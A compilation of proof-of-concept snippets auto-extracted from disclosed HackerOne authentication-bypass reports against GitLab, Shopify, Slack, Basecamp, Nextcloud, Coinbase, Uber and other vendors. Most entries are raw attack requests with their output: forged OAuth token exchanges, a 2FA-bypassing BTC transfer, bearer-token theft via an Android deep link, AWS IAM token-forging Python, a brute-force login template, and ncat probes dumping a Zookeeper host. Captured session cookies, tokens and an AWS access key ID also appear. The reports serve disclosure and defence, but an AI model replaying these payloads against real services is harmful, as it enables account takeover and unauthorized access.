# Authentication bypass — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #136169 OneLogin authentication bypass on WordPress sites — uber — $10,000 — Improper Authentication - Generic
Source: `hackerone/reports/2016/136169.md` (https://hackerone.com/reports/136169)

```
    --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

## #1040786 Exposure of a valid Gitlab-Workhorse JWT leading to various bad things — gitlab — $10,000 — Improper Authentication - Generic
Source: `hackerone/reports/2022/1040786.md` (https://hackerone.com/reports/1040786)

```
 desc 'Add a new terraform state or update an existing one'
          route_setting :authentication, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth
          post do
            authorize! :admin_terraform_state, user_project

            data = request.body.read
```

```
def user
        super || geo_push_user&.user
      end

      def geo_push_user
        @geo_push_user ||= ::Geo::PushUser.new_from_headers(request.headers)
      end
```

```
  def self.new_from_headers(headers)
    return unless needed_headers_provided?(headers)

    new(headers['Geo-GL-Id'])
  end

  def user
    @user ||= identify_using_ssh_key(gl_id)
  end
```

## #1372667 Able to steal bearer token from deep link — basecamp — $6,337 — Improper Authentication - Generic
Source: `hackerone/reports/2022/1372667.md` (https://hackerone.com/reports/1372667)

```
adb shell am start -n com.basecamp.bc3/com.basecamp.bc3.activities.BasecampUrlFilterActivity https://3.basecamp.com/5218370/verify?proceed_to=https://haystack-production-storage.s3.eu-west-2.amazonaws.com/attack.html
```

```
<script>NativeApp.openNativeImageViewer("[{'download_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'preview_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'caption':'ViewImage'}]", 0)</script>
```

```
if (TuroblinksUrlHandler.contains(url, "/verify?", true)) {
                C3982h.nullCheck(url, "$this$proceedToParam");
                C3982h.nullCheck(url, "$this$extractQueryParam");
                C3982h.nullCheck("proceed_to", "queryKey");
                String queryParameter = url.toUri().getQueryParameter("proceed_to");
                url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;
                C3982h.nullCheck(url);
            }

 Intent intent10 = new Intent(context, WebViewActivity.class);
                    C1071a.addUrlsToIntent(url, intent10, "intentUrl", "intentApiUrl", null);
                    return intent10;
```

## #1148364 Mint Oauth2 access token for targeted user — gitlab — $5,580 — Improper Authentication - Generic
Source: `hackerone/reports/2025/1148364.md` (https://hackerone.com/reports/1148364)

```
POST /login/oauth/access_token HTTP/1.1
Host: gdk.test:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: perf_bar_enabled=true; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltTTBaR0ZsWWpWa0xXUXdPRFV0TkRjM05TMWlPRGxtTFRVMk5UYzJORFF3WXpsa01pST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--364fb7d4479cb94e08660b9c20f6b7692c7e53a4; _gitlab_session_a577db8f7188ca777cf6a20a7928c67f45ba397ca4a4a162d17662b5e845194c=d114336bb9c2a113ff2e6d5542e17a63; known_sign_in=bGtzOVNNWWY1SitJVDBMUE5WS0VqbXBvbWRyRzhLaXdzKyt6L0FpanZIMndzYVhRUHZpYnlncjJFSFJzNEl3b0dvMlNaVEF4d25PRys4ZDFiYmgvRUpVRWRVdlVRL3YyUXNaUEx4LzExL25YTWk2KzBIUlg3dldFQlpkQ2dDL2YtLTc4cUhhZmJrK2JUckRvT0FONjBRZ1E9PQ%3D%3D--ddb6a3bf3b2faa846ab4a0b2e0ecef561f0c5a99; sidebar_collapsed=false
Upgrade-Insecure-Requests: 1
Content-Length: 223

code=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4
```

```
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate, no-store
Content-Type: text/plain; charset=utf-8
Etag: W/"a219f8ac2bd29580e1f17894de3956da"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Gitlab-Feature-Category: integrations
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01F2E6M6TER14PB17H6XCDC0B3
X-Runtime: 0.257708
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Date: Sun, 04 Apr 2021 10:25:03 GMT
Content-Length: 105
Connection: close

access_token=bc3450dfcc2fb46eece85d1f74d96070f94cd35e656b184706027227243d5338&scope=api&token_type=Bearer
```

## #1170024 Attacker can obtain write access to any federated share/public link — nextcloud — $4,000 — Improper Authentication - Generic
Source: `hackerone/reports/2021/1170024.md` (https://hackerone.com/reports/1170024)

```
curl -v -X POST http://localhost/index.php/ocm/notifications -d '{"notificationType":"RESHARE_CHANGE_PERMISSION","resourceType":"file","providerId":2,"notification":{"sharedSecret":"nOxdNJkb1xbI1VX","permission":["read","write","share"]}}' -H 'Content-type: application/json'
```

```
{
   "notificationType":"RESHARE_CHANGE_PERMISSION",
   "resourceType":"file",
   "providerId":2,
   "notification":{
      "sharedSecret":"nOxdNJkb1xbI1VX",
      "permission":[
         "read",
         "write",
         "share"
      ]
   }
}
```

```
      "sharedSecret":"nOxdNJkb1xbI1VX",
      "permission":[
         "read",
         "write",
         "share"
      ]
```

## #922456 Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties — gitlab — $3,000 — Authentication Bypass Using an Alternate Path or Channel
Source: `hackerone/reports/2020/922456.md` (https://hackerone.com/reports/922456)

```
POST /oauth/authorize HTTP/1.1
Host: gitlab.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 354
DNT: 1
Connection: close
Cookie: [COOKIES]

utf8=%E2%9C%93&authenticity_token=[CSRF TOKEN]&client_id=6dd35c52b02a99eca3454505c4b1f1fa761ad1125bcdccdbc1c290877ef25093&redirect_uri=https%3A%2F%2Flaravelshift.com%2Fauth%2Fgitlab%2Fcallback&state=[STATE VALUE FROM URL]&response_type=code&scope=&nonce=
```

## #1580493 Bypass validation parts in AWS IAM Authenticator for Kubernetes — kubernetes — $2,500 — Improper Authentication - Generic
Source: `hackerone/reports/2023/1580493.md` (https://hackerone.com/reports/1580493)

```
import base64
import boto3
import re
from botocore.signers import RequestSigner

REGION = 'us-east-1'
CLUSTER_ID = 'gaf-cluster'


def get_bearer_token(url, headers):
    STS_TOKEN_EXPIRES_IN = 60
    session = boto3.session.Session()

    client = session.client('sts', region_name=REGION)
    service_id = client.meta.service_model.service_id

    signer = RequestSigner(
        service_id,
        REGION,
        'sts',
        'v4',
        session.get_credentials(),
        session.events
    )

    params = {
        'method': 'GET',
        'url': url,
        'body': {},
        'headers': headers,
        'context': {}
    }

    signed_url = signer.generate_presigned_url(
        params,
        region_name=REGION,
        expires_in=STS_TOKEN_EXPIRES_IN,
        operation_name=''
    )

    return signed_url


def base64_encode_no_padding(signed_url):
    base64_url = base64.urlsafe_b64encode(signed_url.encode('utf-8')).decode('utf-8')

    # remove any base64 encoding padding:
    return 'k8s-aws-v1.' + re.sub(r'=*', '', base64_url)


def create_mal_token_with_other_action(action_name):
    url = f'https://sts.{REGION}.amazonaws.com/?Action={action_name}&Version=2011-06-15&action=GetCallerIdentity'
    headers = {'x-k8s-aws-id': CLUSTER_ID}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace(f'&action=GetCallerIdentity', '')
    signed_url += f'&action=GetCallerIdentity'

    return base64_encode_no_padding(signed_url)


def create_m
```

```
POST /authenticate HTTP/1.1
Host: 127.0.0.1:21362
Content-Length: 563

{"Spec":{"Token":"<token-value>"}}
```

```
  mapUsers:
  - userARN: arn:aws:iam::000000000000:user/Alice
    username: user:{{AccessKeyID}}
    groups:
    - test
```

## #3329310 Improper bot-authentication allows to impersonate any user when sending messages in a room — basecamp — $2,000 — Improper Authentication - Generic
Source: `hackerone/reports/2025/3329310.md` (https://hackerone.com/reports/3329310)

```
def authenticate_bot(bot_key)
  bot_id, bot_token = bot_key.split("-")
  active.find_by(id: bot_id, bot_token: bot_token)
end
```

```
campfire(prod):038> User.active
=> 
[#<User:0x00007a444e940f18
  id: 1,
  name: "enoent",
  created_at: "2025-09-06 11:59:41.505220000 +0000",
  updated_at: "2025-09-06 14:08:08.788258000 +0000",
  role: "administrator",
  email_address: "[FILTERED]",
  password_digest: "[FILTERED]",
  active: true,
  bio: "<s>ddqsdqsds</s>",
  bot_token: nil>,
 #<User:0x00007a444e940dd8
  id: 2,
  name: "test",
  created_at: "2025-09-06 13:24:29.113250000 +0000",
  updated_at: "2025-09-06 13:42:26.539909000 +0000",
  role: "member",
  email_address: "[FILTERED]",
  password_digest: "[FILTERED]",
  active: true,
  bio: nil,
  bot_token: nil>,
 #<User:0x00007a444e940c98
```

```
POST /rooms/2/2-/messages HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/vnd.turbo-stream.html, text/html, application/xhtml+xml
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 193

Hello ! I'm the test user, even though I'm not authenticated
```

## #2337427 Authentication Bypass with usage of PreSignedURL — owncloud — $2,000 — Improper Access Control - Generic
Source: `hackerone/reports/2024/2337427.md` (https://hackerone.com/reports/2337427)

```
		PreSignedURL: config.PreSignedURL{
			AllowedHTTPMethods: []string{"GET"},
			Enabled:            true,
		},
```

## #3734676 Taskcluster web-server OAuth2 authorization codes are reusable and the exchange handler checks the wrong expiry column — mozilla — $2,000 — Authentication Bypass by Capture-replay
Source: `hackerone/reports/2026/3734676.md` (https://hackerone.com/reports/3734676)

```
$ source ~/.nvm/nvm.sh && nvm use 24.15.0
$ cd taskcluster && yarn install
$ docker compose up -d postgres
$ docker exec taskcluster-postgres-1 psql -U postgres -c "CREATE DATABASE \"taskcluster-test\";"
$ cd services/web-server
$ TEST_DB_URL=postgresql://postgres@localhost:5432/taskcluster-test NODE_ENV=test \
    yarn mocha --grep "TC-002" test/third_party_test.js
```

```
services/web-server/test/third_party_test.js
  unit
    ✔ TC-002 (PoC): authorization code is reusable in violation of RFC 6749 §4.1.2

1 passing
```

```
DELETE FROM authorization_codes
 WHERE code = code_in
   AND client_id = client_id_in
   AND redirect_uri = redirect_uri_in
   AND expires > now()
 RETURNING code, client_id, redirect_uri, identity, identity_provider_id, expires, client_details;
```

## #151470 [IODR] Get business trip via organization id — uber — $2,000 — Improper Authentication - Generic
Source: `hackerone/reports/2016/151470.md` (https://hackerone.com/reports/151470)

```
{"error":{"name":"TchannelUnexpectedError","fullType":"tchannel.unexpected","type":"tchannel.unexpected","message":"Unexpected Error: 'validation_error.must_be_a_valid_uuid_v4'","isErrorFrame":true,"codeName":"UnexpectedError","errorCode":5,"originalId":2,"remoteAddr":"10.160.14.41:21306"}}
```

## #93691 Arbitrary write on s3://shopify-delivery-app-storage/files — shopify — $2,000 — Improper Authentication - Generic
Source: `hackerone/reports/2015/93691.md` (https://hackerone.com/reports/93691)

```
    {
    "expiration": "2015-10-14T15:27:47Z",
    "conditions": [
        {
            "bucket": "shopify-delivery-app-storage"
        },
        [
            "starts-with", "$key", "files/"
        ],
        {
            "acl": "private"
        },
        {
            "success_action_status": "200"
        },
        ["content-length-range", 0, 5368709120]
    ]
    }
```

## #1380121 Critical full compromise of jarvis-new.urbanclap.com via weak session signing — urbancompany — $1,500 — Improper Authentication - Generic
Source: `hackerone/reports/2022/1380121.md` (https://hackerone.com/reports/1380121)

```
>>> from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadSignature
>>> serializer = URLSafeTimedSerializer("███")
>>> serializer.dumps(str("1"))
'███'
```

## #1758174 Unauthorized access to GovSlack — slack — $1,500 — Improper Authentication - Generic
Source: `hackerone/reports/2023/1758174.md` (https://hackerone.com/reports/1758174)

```
await fetch("https://slack.com/api/signup.createTeam?_x_id=noversion-1667355054.372", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "referrer": "https://slack.com/get-started",
    "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n",
    "method": "POST",
    
```

```
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "referrer": "https://slack.com/get-started",
    "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n",
    "method": "POST",
    "mode": "cors"
```

## #184698 Eavesdropping on private Slack calls — slack — $1,000 — Improper Authentication - Generic
Source: `hackerone/reports/2017/184698.md` (https://hackerone.com/reports/184698)

```
POST /api/screenhero.rooms.invite?_x_id=91700980-1479951838.521 HTTP/1.1
Host: hackerone.slack.com
Origin: https://hackerone.slack.com
X-Slack-Version-Ts: 1479949022
[...]

is_video_call=false&responder=U0254GYNR&room=R36L2K8P6&set_active=true&should_share=true&token=<snip>
```

## #128114 Administrator access to a Django Administration Panel on *.sc-corp.net via bruteforced credentials — snapchat — $1,000 — Improper Authentication - Generic
Source: `hackerone/reports/2016/128114.md` (https://hackerone.com/reports/128114)

```
POST /api-auth/login/ HTTP/1.1
Host: 146.148.42.38
Connection: close
Content-Length: 108
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://146.148.42.38
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
DNT: 1
Referer: https://146.148.42.38/api-auth/login/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: csrftoken=Gt5IRFhlh8BekC11btkUdo8doBniN2pJ

csrfmiddlewaretoken=Gt5IRFhlh8BekC11btkUdo8doBniN2pJ&next=%2F&username=admin&password=§password§&submit=Log+in
```

## #2197244 Account deletion using the /v1/account/destroy API endpoint using account password without 2FA verification — mozilla — $1,000 — Improper Authentication - Generic
Source: `hackerone/reports/2024/2197244.md` (https://hackerone.com/reports/2197244)

```
{"email":"<email>","authPW":"<authPW>"}
```

## #154369 Unauthorized access to Zookeeper on http://locutus-zk3.ec2.shopify.com:2181 — shopify — $1,000 — Improper Authentication - Generic
Source: `hackerone/reports/2016/154369.md` (https://hackerone.com/reports/154369)

```
Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
```

```
$ echo dump |ncat 52.2.164.229 2181
SessionTracker dump:
Global Sessions(7):
0x1053c5850800023       4000ms
0x1053c5850800024       4000ms
0x2000b1ecdeb0160       4000ms
0x2000b1ecdeb0161       4000ms
0x2000b1ecdeb0162       4000ms
0x3055d0251540008       4000ms
0x3055d0251540009       4000ms
ephemeral nodes dump:
Sessions with Ephemerals (5):
0x1053c5850800024:
        /borg/locutus/agents/061e4b6/10.92.1.192:9257
0x1053c5850800023:
        /borg/locutus/agents/061e4b6/10.92.1.118:9257
0x3055d0251540008:
        /borg/locutus/agents/061e4b6/10.92.1.120:9257
0x2000b1ecdeb0162:
        /borg/locutus/agents/061e4b6/10.92.1.87:9257
0x3055d0251540009:
        /borg/locutus/agents/061e4b6/10.92.1.10:9257
Connections dump:
Connections Sets (2)/(7):
Ncat: An established connection was aborted by the software in your host machine. .
```

```
$ echo envi |ncat 52.2.164.229 2181
Environment:
zookeeper.version=3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
host.name=locutus-zk3.ec2.shopify.com
java.version=1.7.0_79
java.vendor=Oracle Corporation
java.home=/usr/lib/jvm/java-7-openjdk-amd64/jre
java.class.path=:/etc/zookeeper-locutus:/usr/src/zookeeper-locutus/zookeeper/zookeeper-3.5.1-alpha.jar:/usr/src/zookeeper-locutus/zookeeper/lib/commons-cli-1.2.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-core-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-mapper-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/javacc.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-util-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-0.9.94.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-2.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/log4j-1.2.16.jar:/usr/src/zookeeper-locutus/zookeeper/lib/netty-3.7.0.Final.jar:/usr/src/zookeeper-locutus/zookeeper/lib/servlet-api-2.5-20081211.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.7.5.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.7.5.jar
java.library.path=/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib
java.Ncat: An established connection was aborted by the s
```

## #10554 Bypassing 2FA for BTC transfers — coinbase — $1,000 — Improper Authentication - Generic
Source: `hackerone/reports/2014/10554.md` (https://hackerone.com/reports/10554)

```
POST /accounts/transfer_money HTTP/1.1
Host: coinbase.com
[...]

----------422668630
Content-Disposition: form-data; name="transaction[from]"

51cf4e552f31a99ce200001b
----------422668630
Content-Disposition: form-data; name="transaction[to]"

53440a8092adb7d95000001d
----------422668630
Content-Disposition: form-data; name="transaction[amount]"

0.1
----------422668630
Content-Disposition: form-data; name="transaction[notes]"

Bypassin' 2FA.
----------422668630--
```

```
<li>
  <a href="" class="account-wallet active" data-wallet-id="53440a8092adb7d95000001d">
    <strong>My Wallet</strong> <span>1.00 BTC</span>
  </a>
</li>
```

```
    <strong>My Wallet</strong> <span>1.00 BTC</span>
```

## #90688 create staff member without owner access — shopify — $1,000 — Improper Authentication - Generic
Source: `hackerone/reports/2016/90688.md` (https://hackerone.com/reports/90688)

```
    "Only the the store owner is allowed to create new staff members"
```

## #637194 Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile) — shopify — $500 — Improper Authentication - Generic
Source: `hackerone/reports/2019/637194.md` (https://hackerone.com/reports/637194)

```
Intent intent = new Intent();
intent.setClassName("com.shopify.mobile", "com.shopify.mobile.lib.app.DeepLinkActivity");
intent.setData(Uri.parse("https://www.shopify.com/admin/products")); 
startActivity(intent);
```

## #172733 Add signature to transactions without any permission — shopify — $500 — Improper Authentication - Generic
Source: `hackerone/reports/2016/172733.md` (https://hackerone.com/reports/172733)

```
{"secure_file":{"filetype":"svg","content":"PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBiYXNlUHJvZmlsZT0iZnVsbCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4gIA0KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgYWxlcnQoZG9jdW1lbnQuZG9tYWluKTsNCiAgIDwvc2NyaXB0Pg0KPC9zdmc+","type":"signatures","order_transaction_id":"__Transaction_ID__"}}
```

```
{
  "secure_file": {
    "url": "https://shopify.s3.amazonaws.com/s/files/1/0917/1436/signatures/2e990586-6721-448a-a891-025471d6b2fe.svg?AWSAccessKeyId=AKIAJYM555KVYEWGJDKQ&Expires=1475694450&Signature=DmF7008ou7nn22ypD5Iyq%2BKomMQ%3D"
  }
}
```

```
    "url": "https://shopify.s3.amazonaws.com/s/files/1/0917/1436/signatures/2e990586-6721-448a-a891-025471d6b2fe.svg?AWSAccessKeyId=AKIAJYM555KVYEWGJDKQ&Expires=1475694450&Signature=DmF7008ou7nn22ypD5Iyq%2BKomMQ%3D"
```

## #172837 password less login token expiration issue — shopify — $500 — Improper Authentication - Generic
Source: `hackerone/reports/2016/172837.md` (https://hackerone.com/reports/172837)

```
    Request:
    POST /admin/api/graphql HTTP/1.1
    Host: seclearn.myshopify.com
    Content-Type: application/graphql
    Connection: close
    X-Shopify-Access-Token: f263fb8c544a4cb965d63635a2e1c772
    Accept: application/json
    User-Agent: Shopify Mobile/iPhone OS/5.0 (iPhone6,2/com.jadedpixel.shopify)
    Content-Length: 66
    Accept-Language: en-us
    Accept-Encoding: gzip, deflate
```

```
    mutation{adminPasswordlessLogin(input:{}){passwordlessLoginToken}}
```

```
    Response:
    {"data":{"adminPasswordlessLogin":{"passwordlessLoginToken":"bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135"}}}
```

## #124845 Bypassed password authentication before enabling OTP verification — shopify — $500 — Improper Authentication - Generic
Source: `hackerone/reports/2016/124845.md` (https://hackerone.com/reports/124845)

```
POST /admin/users/61826947/2fa/send_sms HTTP/1.1
Host: pranav2111.myshopify.com
Connection: keep-alive
Content-Length: 164
Accept: text/html, */*; q=0.01
Origin: https://pranav2111.myshopify.com
X-CSRF-Token: JTHqOddyHCcNf4FDli1W8YPgfm8Ot+VaCmC7Cv9fRaSam1BO56YCGPybeLwPP0gf1UjAaxrktloxviLYK/3D7Q==
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://pranav2111.myshopify.com/admin/settings/account/61826947
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: _secure_admin_session_id=dcdfb333c3f86c849e450b02b56ffd2b; user_auth_token=3cbcfe7e0190e4305ac74c29f31b8c96; ajs_anonymous_id=%229769d3c8-ad20-4609-874f-a78aa0cd3839%22; __ssid=5ec9ad9a-e032-4f95-a751-3aa871975c14; __utmt=1; _gat=1; _ab=1; storefront_digest=6734c1fe18d51ffeb3010a1e1ee2ac60ed1713a8d9ae4e2cdcfe2572b7bcbacd; _ga=GA1.2.1005531135.1458584824; ajs_user_id=null; ajs_group_id=null; _shopify_s=E42D7057-E27E-48C2-0985; _shopify_s=E42D7057-E27E-48C2-0985; _shopify_y=3A536E63-2299-41F8-666A; _shopify_y=3A536E63-2299-41F8-666A; __utma=1.1005531135.1458584824.1458584867.1458584867.1; __utmb=1.10.10.1458584867; __utmc=1; __utmz=1.1458584867.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; request_method=PUT

utf8=%E2%9C%93&authenticity_token=rsa0kKgaoxEIXhGgG50VRmQlN%2ByJ%2BGy8YhRyyyz
```

```
POST /admin/users/61715715/2fa/send_sms HTTP/1.1
Host: pranav211.myshopify.com
Connection: keep-alive
Accept: text/html, */*; q=0.01
Origin: https://pranav2111.myshopify.com
X-CSRF-Token: Kx73sRC9HbGJj9jLtQ9NgRUC8pQGa4tJpOezLAVH5tIgJum406kGTyWq01inBiQogJopoTONXZHmZsIDKjlmyA==
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://pranav211.myshopify.com/admin/settings/account/61715715
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: _secure_admin_session_id=a8a57b3817251c4f15f6f41049c07efd; user_auth_token=9422e2060214202ffbac68226276f174; ajs_anonymous_id=%226775537b-23a4-49b5-b997-11ecce666834%22; __ssid=1c4fa8d1-7e09-46dd-bb80-1953c602cca9; _shopify_ga=_ga=1.56909218.985506741.1458494246; _ab=1; storefront_digest=9f55a543312d0d3b8c9558ee41c5c028b9bc204952ca6742ae8f627e17c69be4; __utma=1.985506741.1458494246.1458494304.1458584501.2; __utmb=1.23.10.1458584501; __utmc=1; __utmz=1.1458494304.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; _ga=GA1.2.985506741.1458494246; ajs_user_id=null; ajs_group_id=null; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_y=C854D035-5F8B-4E27-F41C; _shopify_y=C854D035-5F8B-4E27-F41C; request_method=POST
Content-Length: 164

utf8=%E2%9C%93&authenticity_token=rsa0kKgaoxEIXhG
```

```
POST /admin/users/61715715/2fa/confirm HTTP/1.1
Host: pranav211.myshopify.com
Connection: keep-alive
Accept: text/html, */*; q=0.01
Origin: https://pranav2111.myshopify.com
X-CSRF-Token: Kx73sRC9HbGJj9jLtQ9NgRUC8pQGa4tJpOezLAVH5tIgJum406kGTyWq01inBiQogJopoTONXZHmZsIDKjlmyA==
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://pranav211.myshopify.com/admin/settings/account/61715715
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: _secure_admin_session_id=a8a57b3817251c4f15f6f41049c07efd; user_auth_token=9422e2060214202ffbac68226276f174; ajs_anonymous_id=%226775537b-23a4-49b5-b997-11ecce666834%22; __ssid=1c4fa8d1-7e09-46dd-bb80-1953c602cca9; _shopify_ga=_ga=1.56909218.985506741.1458494246; _ab=1; storefront_digest=9f55a543312d0d3b8c9558ee41c5c028b9bc204952ca6742ae8f627e17c69be4; __utma=1.985506741.1458494246.1458494304.1458584501.2; __utmb=1.23.10.1458584501; __utmc=1; __utmz=1.1458494304.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; _ga=GA1.2.985506741.1458494246; ajs_user_id=null; ajs_group_id=null; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_y=C854D035-5F8B-4E27-F41C; _shopify_y=C854D035-5F8B-4E27-F41C; request_method=POST
Content-Length: 160

utf8=%E2%9C%93&_method=put&authenticity_token=H5kz
```

## #101063 Drivers can change profile picture — uber — $500 — Improper Authentication - Generic
Source: `hackerone/reports/2016/101063.md` (https://hackerone.com/reports/101063)

```
             An error will occur saying "Failed to update account details" but the new picture will be applied
```

## #156520 Unauthorized team members can leak information and see all API calls through /1/admin/* endpoints, even after they have been removed. — algolia — $400 — Improper Authentication - Generic
Source: `hackerone/reports/2016/156520.md` (https://hackerone.com/reports/156520)

```
POST /1/admin/listindexes HTTP/1.1
Host: c5-eu-1.algolianet.com
....

{"applicationID":"APP_ID","signature":"SIGNATURE","page":0,"sortByNbEntries":1}
```

```
POST /1/admin/userlogs HTTP/1.1
